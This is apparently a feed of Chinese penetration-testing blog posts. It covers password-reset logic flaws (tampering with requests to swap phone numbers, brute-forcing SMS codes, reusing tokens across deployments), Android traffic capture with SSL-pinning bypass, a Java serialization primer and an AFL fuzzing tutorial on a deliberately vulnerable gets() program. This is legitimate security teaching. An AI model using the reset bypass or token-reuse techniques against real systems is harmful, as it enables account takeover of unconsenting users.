title="2、验证码验证逻辑错误"></a>2、验证码验证逻辑错误</h4><ul><li><strong>未校验验证码与用户的关系</strong></li></ul><p>这个例子比较简单，即攻击者向服务器提交修改密码的请求，服务器向攻击者返回用于修改密码的验证码，但攻击者在修改密码的包中将目标用户从攻击者改为受害者，而服务器并没有校验验证码是否属于目标用户，导致攻击者使用自己的验证码修改了受害者的密码。</p><p>此漏洞在实现较为完善的系统上应该不会出现，而且利用此漏洞需要攻击者拥有一个目标系统的普通账号，如果攻击者没有普通账号权限且无法进行用户注册则无法利用此漏洞。</p><ul><li><strong>修改密码的包可由用户控制且服务器未校验</strong></li></ul><p>对着某系统修改密码逻辑进行抓包时发现在找回密码时，系统会在第一个包中校验用户名与手机号是否匹配，不匹配就无法在浏览器中进行下一步，但是在BurpSuite中可以绕过页面本身的限制，在发送验证码时客户端向服务端发送了用户名和手机号，这一步服务器并没有根据用户ID直接根据存储的手机号信息发送验证码，因此我们可以篡改这一步的手机号信息，将受害者的手机号修改为自己指定的手机号：</p><blockquote><p>图中手机号为某在线短信接收网站中的手机号码</p></blockquote><p><img src="https://i.loli.net/2021/02/09/oCO8nAGhgyHkVPs.png" alt="image.png"></p><p>从自己指定的手机号中获取验证码之后下一步则是验证验证码是否有效，数据包如下，客户端向服务器发送了手机号与验证码，并没有发送用户ID信息，因此这一步并没有校验手机号与用户是否匹配，因为开发人员人为这一步在找回密码的第一步已经校验过了，下图为篡改的手机号与收到的验证码通过服务器认证的步骤：</p><p><img src="https://i.loli.net/2021/02/09/zsP9TV78ZiXuGIr.png" alt="image.png"></p><p>验证码验证成功之后就是修改密码的数据包，这一过程客户端发送的数据包含用户ID、用户手机号、手机验证码、修改的新密码，由于上一个包已经校验了验证码的有效性，因此可以大胆猜测这一步不会再校验验证码是否正确，且这一步需要正确填写受害者的手机号，验证码可以随意填写，密码填写为自己指定的密码，进行发包，果不其然，这一步服务器并没有检查验证码的有效性，密码修改成功。</p><p><img src="https://i.loli.net/2021/02/09/lOq47GyojC2R5Up.png" alt="image-20210106150254745.png"></p><p>导致此问题的根本原因是业务系统在实现的过程中为了降低耦合性或者是为了减少性能开销（如修改密码过程中一次性校验多组数据可能会耗费较多系统资源），将验证步骤进行了分解，正常用户在浏览器中进行操作时这些多步骤验证操作确实可以形成完整的校验逻辑，即用户有任何一步输入错误都会导致密码修改失败，但是攻击者通过BurpSuite等工具可以绕过这些验证逻辑的统一性导致密码认证逻辑漏洞。</p><p>将此攻击过程拓展到通用场景即为：当目标程序在修改密码时没有将所有需要绑定的数据进行一次性（单个数据包）绑定认证时，就有可能存在这样的漏洞。</p><h4 id="3、验证码爆破"><a href="#3、验证码爆破" class="headerlink" title="3、验证码爆破"></a>3、验证码爆破</h4><p>利用爆破的方式来完成任意用户密码重置的前提是验证码验证这一过程可以短时间内重复多次，如果重复几次服务器就限制访问的情况下显然无法采用爆破的方式来突破验证码，以下为验证码可爆破的利用场景。</p><ul><li><strong>验证码有效期较长</strong>（超过规定的有效期但实际还是可用）</li></ul><p>手机或短信的验证码一般情况下会存在有效期，多为5分钟或10分钟，在某些实现相对不完善的业务系统中，点击忘记密码获取验证码时验证码显示的有效时长为5分钟，但业务系统可能并没有及时清除超时的验证码，因此验证码真实有效时间比标注的有效时间更长，甚至多次点击忘记密码之后系统会生成较多有效验证码同时存在于系统验证逻辑中，可以大大增加验证码爆破成功的概率。</p><ul><li><strong>验证码长度短</strong></li></ul><p>验证码长度较短时，一般长度为4，当验证码为数字组成时则验证码生成区间为0000<del>9999共10000种可能性，假设验证码有效期为5分钟，则5分钟内爆破10000次平均每秒发10000 &#x2F; 5 &#x2F; 60 ~&#x3D; <code>33</code>个包，对于服务器压力较大，尤其是在有代理存在的情况下网络延迟较高可能无法达到这样的发包速度，因此可以只爆破一半如爆破0000</del>4999的验证码，发包频率就是原来的一半，但是此时如果验证码生成的区间为5000~9999时则无法成功爆破出验证码，因此可以多爆破几轮，按照概率是可较快爆破出目标验证码完成密码篡改的。</p><h3 id="Cookie通用问题"><a href="#Cookie通用问题" class="headerlink" title="Cookie通用问题"></a>Cookie通用问题</h3><p>最近遇到的比较多的还有撞库问题，即A目标单位部署了某X业务系统，在B非目标单位中找到与A单位相同的X业务系统，B单位的X系统存在弱密码，因此可以直接获取access_token，将B单位X系统的Token用在A单位的X业务系统中可以直接登录A单位的X系统，这种情况是因为同一个业务系统的Token生成流程完全一致，举个例子，B单位的管理员账号名为admin，其access_token生成逻辑为md5(“username”)，当A单位的管理员用户名也为admin时则md5()函数的返回值与B单位业务系统代码的返回值完全一致，因此导致Cookie信息可以“一次获取，多系统登录”。</p><p>个人感觉这样的漏洞在认证环节复杂的系统上更容易出现，尤其是免密登录的SSO场景，其生成的Token为了保证减少服务器负担，可能只有一次校验逻辑，即校验用户名与Token是否匹配，而不会校验用户名和密码的组合与Token是否匹配，因为这里存在一个惯性逻辑问题即用户拿着Token来进行认证的时候服务器假定用户已经通过了用户名＋密码的验证逻辑，因此在SSO登录时就不校验密码了，导致Token生成算法一致的两个系统中存在相同用户名的用户认证信息完全一致的情况。</p><p>在实际攻击场景中，如果某业务系统迟迟拿不下来可以通过fofa搜索相同的系统，即使这个系统的Cookie无法复用也可以找一些未授权访问的接口来做进一步的信息收集，不过这种方法严格意义上不符合渗透规范，容易被请去喝茶，所以还是慎用。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>验证码发送过程中也有较大概率存在短信轰炸的问题，攻击者可以不断请求短信发送接口，受害者就会被短信轰炸。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;在渗透测试项目中，很多时候横在我们渗透路上的第一个拦路虎就是后台登录界面，有时可以通过找弱密码的方式直接获取登录后的权限，有时也可以通过钓鱼或者在其他业务系统中拿到的账户密码来登录目标系统获取更多权限，有时也可以通过未授权访问漏洞来获取本应登录后才能拿到的数据，但是如果没有以上渠道，想要获取一个靶标系统的访问权限就比较难了，因此下文总结身份认证逻辑缺陷相关漏洞挖掘思路。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.hvnt3r.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
    <category term="逻辑漏洞" scheme="https://www.hvnt3r.top/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP抓包教程</title>
    <link href="https://www.hvnt3r.top/2020/12/%E5%AE%89%E5%8D%93APP%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B/"/>
    <id>https://www.hvnt3r.top/2020/12/%E5%AE%89%E5%8D%93APP%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B/</id>
    <published>2020-12-30T14:28:09.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安卓APP抓包"><a href="#安卓APP抓包" class="headerlink" title="安卓APP抓包"></a>安卓APP抓包</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在渗透测试项目中，有很多目标单位有专属的APP，其中APP自身安全和APP对应的服务端接口也是渗透测试的攻击面，但是现有的APP安全防护措施不断提高，从APP本身发现安全问题的可能性降低，且服务器与客户端的通信过程也有较多的安全校验，下文将介绍安卓APP的抓包方法，方便渗透测试过程中的漏洞挖掘。</p><span id="more"></span><h4 id="证书校验"><a href="#证书校验" class="headerlink" title="证书校验"></a>证书校验</h4><p>现在很多APP的网络请求都使用HTTPS，HTTP报文可以很轻松的通过在手机上设置代理然后通过BurpSuite等报文嗅探、代理软件截获，便于后续分析，但是HTTPS报文传输过程需要证书认证，现有多数APP还有双向认证机制，即不仅服务器要校验请求是否来源于真正的客户端，客户端也会校验收到的信息是否来自于服务器，而且安卓7.0之后，APP只会识别系统级别的证书，而从BurpSuite和Charles中导出安装的证书是用户级证书，因此导致在转包软件中无法抓到相应APP的流量数据，因此有两种方法可以安装:</p><ul><li>获取Root权限，然后将抓包软件的证书安装为系统级证书</li></ul><p>使用ADB安装证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.从Charles取出证书</span><br><br>charles-proxy-ssl-proxying-certificate.pem<br><span class="hljs-comment"># 2.获取证书hash，并修改证书文件名为hash+后缀&#x27;&#x27;.0&#x27;&#x27; 。本例为fc0dd2c8.0</span><br><br>iMac:~ imac$ openssl x509 -<span class="hljs-keyword">in</span> ./charles-proxy-ssl-proxying-certificate.pem   -noout -subject_hash<br><br><span class="hljs-comment"># 执行结果：fc0dd2c8</span><br><span class="hljs-comment"># 3.连接测试机，adb shell 修改 /system权限，</span><br>adb push fc0dd2c8.0 证书到 /system/etc/security/cacerts/<br><br>mount -o rw,remount /system<br><span class="hljs-comment"># 4.修改证书权限为664，重启设备</span><br><br><span class="hljs-built_in">cd</span> /system/etc/security/cacerts/<br><br><span class="hljs-built_in">chmod</span> 664 ./fc0dd2c8.0<br><br>reboot<br></code></pre></td></tr></table></figure><ul><li>修改APP包Androidmanifest，文件并将APP重新打包</li></ul><h4 id="APP校验证书"><a href="#APP校验证书" class="headerlink" title="APP校验证书"></a>APP校验证书</h4><p>有些APP会有SSL pinning通过APP自身代码校验证书和服务器的关系，这种情况下使用自己导出的证书无法通过此步认证，可以通过逆向APP将APP验证的证书提取出来，证书通常在&#x2F;assets目录下，通过jeb等反编译工具全局搜索cer、p12、pem、ssl等关键字可以找到相应证书未知，将证书导出并导入到抓包程序内即可，如下如是某APP内证书存放位置：</p><p><img src="https://i.loli.net/2021/02/09/tHYfqAaXJS4uBZO.png" alt="JEB界面"></p><h4 id="模拟器抓包"><a href="#模拟器抓包" class="headerlink" title="模拟器抓包"></a>模拟器抓包</h4><p>可能为了更方便的实现模拟器自身的功能，目前市面上多款模拟器的安卓版本多为安卓6，因此在抓包就相对容易一些，首先在模拟器中安装Xposed框架，然后在框架中安装JustTrustMe模块，安装成功后界面如下：</p><p><img src="https://i.loli.net/2021/02/09/kPeD9Yjtqlf14cB.png" alt="JustTrustMe"></p><p>在模拟器中将系统代理地址设置为Charles地址，默认为本机IP＋8090端口</p><p><img src="https://i.loli.net/2021/02/09/fVQlYm8OJuwZpbq.png" alt="代理修改"></p><p>抓包成功示意图：</p><p><img src="https://i.loli.net/2021/02/09/2B3oEN6x9IbV1Cy.png" alt="抓包"></p><p>对于部分反分析功能比较完善的APP，以上分析方法可能就会失效，比如APP会校验自身运行环境是否已授权Root，如果已授权则禁止运行，或者检测是否安装Xposed这种通常在正常使用环境中不会出现的APP就会退出等，遇到这种APP还是要先通过逆向将检测逻辑给过掉才能继续分析。</p><h4 id="代理APP"><a href="#代理APP" class="headerlink" title="代理APP"></a>代理APP</h4><p>除了以上手机抓包方式，还有一个可以安装在目标安卓系统的一款APP：Packet Capture，此应用通过设置系统代理的方式截获其他APP的数据包，也可以对一些没有双向认证的APP进行简单地分析。</p><p>软件界面：</p><p><img src="https://i.loli.net/2021/02/09/bnjCSdK4y3kHthq.png" alt="抓包"></p><p>抓包界面：</p><p><img src="https://i.loli.net/2021/02/09/DGOM5CZ6du1mS2z.png" alt="数据包内容"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上方法可以实现安卓客户端流量抓取，方便渗透测试过程中发现更多渗透入口。</p><p><a href="https://www.yuanrenxue.com/app-crawl/android-7-capture-data.html">参考文章</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;安卓APP抓包&quot;&gt;&lt;a href=&quot;#安卓APP抓包&quot; class=&quot;headerlink&quot; title=&quot;安卓APP抓包&quot;&gt;&lt;/a&gt;安卓APP抓包&lt;/h3&gt;&lt;h4 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h4&gt;&lt;p&gt;在渗透测试项目中，有很多目标单位有专属的APP，其中APP自身安全和APP对应的服务端接口也是渗透测试的攻击面，但是现有的APP安全防护措施不断提高，从APP本身发现安全问题的可能性降低，且服务器与客户端的通信过程也有较多的安全校验，下文将介绍安卓APP的抓包方法，方便渗透测试过程中的漏洞挖掘。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.hvnt3r.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="逆向" scheme="https://www.hvnt3r.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="安卓" scheme="https://www.hvnt3r.top/tags/%E5%AE%89%E5%8D%93/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞分析</title>
    <link href="https://www.hvnt3r.top/2020/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>https://www.hvnt3r.top/2020/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2020-12-19T02:59:11.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<p>序列化与反序列化简介</p><blockquote><p>Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。</p><p>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。</p><p>整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p><p>类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。</p><p>–<a href="https://www.runoob.com/java/java-serialization.html">https://www.runoob.com/java/java-serialization.html</a></p></blockquote><span id="more"></span><h2 id="序列化与反序列化代码示例"><a href="#序列化与反序列化代码示例" class="headerlink" title="序列化与反序列化代码示例"></a>序列化与反序列化代码示例</h2><p><strong>声明一个类</strong></p><p>下面做代码演示，首先我们声明一个类，一个类想要序列化成功，必须实现java.io.Serializeable接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> String phoneNumber;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nameCheck</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;name is &quot;</span> + name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>序列化</strong></p><p>下面代码完成了类的实例化和序列化到文件的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类的实例化</span><br><span class="hljs-type">Employee</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>e.name = <span class="hljs-string">&quot;Hvnt3r&quot;</span>;<br>e.phoneNumber = <span class="hljs-string">&quot;144413141123&quot;</span>;<br><br><span class="hljs-comment">//类的序列化</span><br><span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>outputStream.writeObject(e);<br>outputStream.close();<br>fileOutputStream.close();<br></code></pre></td></tr></table></figure><p>运行此段代码即可生成一个名为test.ser的二进制文件，此时通过xxd查看test.ser内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hex">00000000: aced 0005 7372 0013 636f 6d2e 6876 6e74  ....sr..com.hvnt<br>00000010: 3372 2e45 6d70 6c6f 7965 6578 a396 1a12  3r.Employeex....<br>00000020: a6d9 8602 0002 4c00 046e 616d 6574 0012  ......L..namet..<br>00000030: 4c6a 6176 612f 6c61 6e67 2f53 7472 696e  Ljava/lang/Strin<br>00000040: 673b 4c00 0b70 686f 6e65 4e75 6d62 6572  g;L..phoneNumber<br>00000050: 7100 7e00 0178 7074 0006 4876 6e74 3372  q.~..xpt..Hvnt3r<br>00000060: 7400 0c31 3434 3431 3331 3431 3132 33    t..144413141123<br></code></pre></td></tr></table></figure><p><strong>反序列化</strong></p><p>通过objectInputStream.readObject()方法将序列化的文件转化为Employee类的引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>e = (Employee) objectInputStream.readObject();<br>objectInputStream.close();<br>fileInputStream.close();<br><br>System.out.println(<span class="hljs-string">&quot;Deserialize Employee ...&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;Name: &quot;</span> + e.name);<br>System.out.println(<span class="hljs-string">&quot;Phone: &quot;</span> + e.phoneNumber);<br></code></pre></td></tr></table></figure><p>代码输出如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">Deserialize Employee ...<br><span class="hljs-symbol">Name:</span> Hvnt3r<br><span class="hljs-symbol">Phone:</span> <span class="hljs-number">144413141123</span><br></code></pre></td></tr></table></figure><h2 id="漏洞产生与利用"><a href="#漏洞产生与利用" class="headerlink" title="漏洞产生与利用"></a>漏洞产生与利用</h2><p>未完待续👨‍💻</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;序列化与反序列化简介&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。&lt;/p&gt;
&lt;p&gt;将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。&lt;/p&gt;
&lt;p&gt;整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。&lt;/p&gt;
&lt;p&gt;类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。&lt;/p&gt;
&lt;p&gt;–&lt;a href=&quot;https://www.runoob.com/java/java-serialization.html&quot;&gt;https://www.runoob.com/java/java-serialization.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
    <category term="Java反序列化" scheme="https://www.hvnt3r.top/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="漏洞" scheme="https://www.hvnt3r.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>AFL初体验</title>
    <link href="https://www.hvnt3r.top/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://www.hvnt3r.top/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2020-02-23T14:19:17.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>AFL全程American Fuzzy Lop，是由安全研究员Michał Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p></blockquote><h2 id="AFL安装"><a href="#AFL安装" class="headerlink" title="AFL安装"></a>AFL安装</h2><p>AFL在ubuntu下可以直接使用以下指令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install afl<br></code></pre></td></tr></table></figure><span id="more"></span><h2 id="测试对象生成"><a href="#测试对象生成" class="headerlink" title="测试对象生成"></a>测试对象生成</h2><p>安装完成之后写一个小程序用测试AFL，程序源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">gcc -fno-stack-protector -z execstack vuln.c -o vuln</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> login[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">char</span> password[<span class="hljs-number">32</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Username: \n&quot;</span>);<br>    gets(login);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password: \n&quot;</span>);<br>    gets(password);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(login, <span class="hljs-string">&quot;root&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(password, <span class="hljs-string">&quot;qwer1234&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Granted!\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Denied.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本程序就是一个简单的验证用户名和密码的小程序，本程序根据输入结果有三条执行流：</p><ul><li>用户名错误且密码错误</li><li>用户名正确但密码不正确</li><li>用户名正确且密码正确</li></ul><p>使用afl-gcc编译源代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -z execstack vuln.c -o vuln<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># afl-gcc -fno-stack-protector -z execstack vuln.c -o vuln</span><br>afl-cc 2.52b by &lt;lcamtuf@google.com&gt;<br>vuln.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>vuln.c:15:5: warning: implicit declaration of <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;gets&#x27;</span>; did you mean <span class="hljs-string">&#x27;fgets&#x27;</span>? [-Wimplicit-function-declaration]<br>     gets(login);<br>     ^~~~<br>     fgets<br>afl-as 2.52b by &lt;lcamtuf@google.com&gt;<br>[+] Instrumented 6 locations (64-bit, non-hardened mode, ratio 100%).<br>/tmp/ccudSZMx.o: In <span class="hljs-keyword">function</span> `main<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">/pwn/AFL_learning/vuln.c:15: warning: the `gets&#x27;</span> <span class="hljs-keyword">function</span> is dangerous and should not be used.<br></code></pre></td></tr></table></figure><p>使用checksec命令的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># checksec vuln</span><br>[*] <span class="hljs-string">&#x27;/pwn/AFL_learning/vuln&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      PIE enabled<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure><h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>为了模拟上文提到的程序运行的三条执行流分别对应的结果，创建两个目录分别作为AFL的输入目录和输出目录。比如如下目录结构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/AFL_testFolder/<br>       |<span class="hljs-string"></span><br><span class="hljs-string">       </span>|<span class="hljs-string">-------/testcases/----</span>|<br>       |<span class="hljs-string">                      </span>|<span class="hljs-string">test1.txt</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">test2.txt</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">test3.txt</span><br><span class="hljs-string">       </span>|<br>       |<span class="hljs-string">-------/results/</span><br></code></pre></td></tr></table></figure><p>其中testcases中各个文件的文件内容如下：</p><p><strong>test1.txt</strong></p><p><em>模拟用户名和密码都不正确的情况</em></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aasdqf</span><br><span class="hljs-attribute">sqwdqfs</span><br></code></pre></td></tr></table></figure><p><strong>test2.txt</strong></p><p><em>模拟用户名正确但是密码不正确的情况</em></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">root</span><br><span class="hljs-attribute">asdfasdfasd</span><br></code></pre></td></tr></table></figure><p><strong>text3.txt</strong></p><p><em>模拟用户名和密码都正确的情况</em></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">root</span><br>qwer1234<br></code></pre></td></tr></table></figure><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p>将以上文件布置好之后即可开始fuzzing：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 